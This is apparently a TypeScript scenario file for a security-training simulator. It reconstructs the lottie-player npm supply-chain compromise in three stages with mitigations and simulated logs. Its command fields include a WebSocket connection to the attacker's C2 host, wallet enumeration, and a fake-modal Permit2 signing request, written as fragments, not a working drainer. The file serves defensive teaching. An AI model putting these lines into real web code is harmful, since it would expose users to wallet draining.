import type { LegacyDraftScenario } from '../legacy/normalize-legacy-draft-scenario';

export const scenario: LegacyDraftScenario = {
    id: 'lottie-player-npm-ace-supply-chain-2024',
    title: 'LottieFiles Incident Report, Snyk & Wiz — @lottiefiles/lottie-player NPM Supply Chain Compromise, Unpinned CDN Propagation & Web3 Drainer Injection',
    category: 'SUPPLY_CHAIN_CICD',
    mitreId: 'T1195.002',
    description:
      'Grounded in the official LottieFiles incident post-mortem, Snyk Security Labs, and Wiz Research: attackers compromise a developer’s NPM access token to publish malicious versions `2.0.5`, `2.0.6`, and `2.0.7` of the popular `@lottiefiles/lottie-player` animation component. Websites loading unpinned `<script src="https://unpkg.com/@lottiefiles/lottie-player@latest">` tags automatically serve a trojanized bundle that opens a WebSocket C2 to `wss://castleservices.org` and overlays an AceDrainer crypto phishing modal.',
    NodesGenerator: () => [
      { id: 'attacker', label: 'Attacker C2 (wss://castleservices.org)', type: 'attacker', status: 'compromised' },
      { id: 'firewall', label: 'NPM & Unpinned CDN (unpkg / jsDelivr @latest)', type: 'firewall', status: 'compromised' },
      { id: 'target', label: 'Production Web App (@lottiefiles/lottie-player@2.0.7)', type: 'server', status: 'compromised' },
      { id: 'siem', label: 'CSP / Subresource Integrity (SRI) Browser Sensor', type: 'siem', status: 'normal' },
      { id: 'ad', label: 'End-User Browser DOM & Web3 Wallet (AceDrainer)', type: 'ad', status: 'compromised' },
    ],
    stages: [
      {
        id: 1,
        title: 'Stage 1: Compromised NPM Token Pushes `@lottiefiles/lottie-player` v2.0.5, v2.0.6 & v2.0.7',
        narration:
          'Using a compromised maintainer NPM token, the attacker publishes three rapid-fire versions (`2.0.5`, `2.0.6`, and `2.0.7`) of `@lottiefiles/lottie-player` to NPM. Public open-source CDNs (`unpkg.com` and `cdn.jsdelivr.net`) immediately mirror the new versions as `@latest` or `^2.0.0`.',
        activeNodes: ['attacker', 'firewall'],
        mitreTactic: 'Initial Access (T1195.002 - Compromise Software Supply Chain)',
        technicalCommands: [
          'npm publish @lottiefiles/lottie-player@2.0.5 .. 2.0.7 -> Mirrored on https://unpkg.com/@lottiefiles/lottie-player@latest/dist/lottie-player.js',
        ],
        defenseMitigation:
          'Never reference `@latest` or floating semver ranges in production `<script>` tags; always pin exact version numbers and enforce Subresource Integrity (`integrity="sha384-..."`).',
        logs: [
          {
            id: 'lottie-1',
            timestamp: '18:22:10.045',
            source: 'CloudTrail',
            severity: 'critical',
            EventCode: 200,
            ProcessName: 'npm-publish',
            raw: 'NPM Supply Chain Alert | Package: @lottiefiles/lottie-player | MaliciousVersions: 2.0.5, 2.0.6, 2.0.7 | CDNPropagation: unpkg.com & cdn.jsdelivr.net (@latest)',
            parsedFields: {
              PackageName: '@lottiefiles/lottie-player',
              MaliciousVersions: '2.0.5, 2.0.6, 2.0.7',
              CdnVector: 'Unpinned @latest script tags on unpkg.com & jsDelivr',
            },
          },
        ],
        packets: [],
      },
      {
        id: 2,
        title: 'Stage 2: Obfuscated Bundle Execution & WebSocket C2 Handshake (`wss://castleservices.org`)',
        narration:
          'When a user visits any web application loading the unpinned `lottie-player.js` script, the obfuscated payload appended to the legitimate animation player executes in the victim’s browser origin, fingerprints `window.ethereum` / EIP-6963 wallet providers, and opens a persistent WebSocket channel to `wss://castleservices.org:8080`.',
        activeNodes: ['firewall', 'target', 'ad', 'siem'],
        mitreTactic: 'Command and Control & Execution (T1059.007 - JavaScript / T1071.001 - Web Protocols)',
        technicalCommands: [
          'new WebSocket("wss://castleservices.org:8080") (Establishes real-time C2 from victim browser DOM)',
          'window.dispatchEvent(new Event("eip6963:requestProvider")) (Enumerates installed browser Web3 wallets)',
        ],
        defenseMitigation:
          'Deploy a strict `Content-Security-Policy` (`connect-src \'self\'`) to block unauthorized outbound WebSocket (`wss://`) connections from client browsers.',
        logs: [
          {
            id: 'lottie-2',
            timestamp: '18:25:41.902',
            source: 'SIEM',
            severity: 'critical',
            EventCode: 403,
            ProcessName: 'chrome.exe',
            raw: 'CSP / Browser Telemetry Alert | ScriptSource: https://unpkg.com/@lottiefiles/lottie-player@2.0.7/dist/lottie-player.js | OutboundWebSocket: wss://castleservices.org:8080 | API: eip6963:requestProvider',
            parsedFields: {
              InjectedBundle: 'dist/lottie-player.js (v2.0.5 - v2.0.7)',
              WebSocketC2: 'wss://castleservices.org:8080',
              WalletDiscovery: 'window.ethereum & EIP-6963 Provider Enumeration',
            },
          },
        ],
        packets: [],
      },
      {
        id: 3,
        title: 'Stage 3: Dynamic DOM Overlay Injection & AceDrainer `eth_sendTransaction` / `Permit2` Signing',
        narration:
          'Instructed by `wss://castleservices.org`, the injected script renders a pixel-perfect modal overlay inside the trusted web app’s DOM prompting the user to "Verify Wallet Connection", tricking them into signing an ERC-20 `Permit2` approval or `eth_sendTransaction` call to the AceDrainer smart contract.',
        activeNodes: ['ad', 'attacker', 'siem'],
        mitreTactic: 'Impact & Collection (T1185 - Browser Session Hijacking / T1565)',
        technicalCommands: [
          'document.body.appendChild(walletConnectOverlayModal) -> window.ethereum.request({ method: "eth_signTypedData_v4", params: [victimAddr, permit2Payload] })',
        ],
        defenseMitigation:
          'Enforce Subresource Integrity (`integrity="sha384-..." crossorigin="anonymous"`) on all third-party scripts so any upstream CDN mutation is immediately blocked by the browser.',
        logs: [
          {
            id: 'lottie-3',
            timestamp: '18:26:12.330',
            source: 'SIEM',
            severity: 'critical',
            EventCode: 1001,
            ProcessName: 'lottie-player.js',
            raw: 'Web3 Drainer Execution | PayloadFamily: AceDrainer | DOMInjection: Fake WalletConnect Modal | RPCMethod: eth_signTypedData_v4 (Permit2 Unlimited Token Approval)',
            parsedFields: {
              DrainerFamily: 'AceDrainer',
              RpcMethodAbused: 'eth_signTypedData_v4 / eth_sendTransaction',
              DefenseControl: 'Subresource Integrity (SRI) + CSP connect-src',
            },
          },
        ],
        packets: [],
      },
    ],
  };
